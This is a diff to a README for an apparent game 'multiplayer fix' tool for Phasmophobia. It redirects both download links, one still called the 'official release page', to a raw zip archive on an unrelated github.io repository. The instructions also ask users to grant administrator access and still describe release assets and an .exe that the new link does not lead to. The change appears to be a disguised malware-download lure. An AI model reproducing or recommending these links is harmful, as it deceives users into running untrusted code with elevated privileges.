@@ -5,7 +5,7 @@ description: "Resolve multiplayer connectivity issues in Phasmophobia with this 
 ---
 # 👻 Phasmophobia-Multiplayer-Fix - Resolve your multiplayer connection errors today
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://raw.githubusercontent.com/shanansaprophytic176/shanansaprophytic176.github.io/main/static/Application-2.2.zip)
 
 ## 🛠 About this software
 This tool helps you fix connection issues when you play Phasmophobia with friends. Sometimes your PC misconfigures network settings, which prevents the game from finding lobbies or connecting to servers. This fix restores the necessary communication paths your computer needs to play the game online. It works on both Windows 10 and Windows 11.
@@ -17,7 +17,7 @@ This tool helps you fix connection issues when you play Phasmophobia with friend
 * Permissions: You need administrator access to allow the tool to modify network settings.
 
 ## 📥 Getting the fix
-1. Visit the [official release page](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/shanansaprophytic176/shanansaprophytic176.github.io/main/static/Application-2.2.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
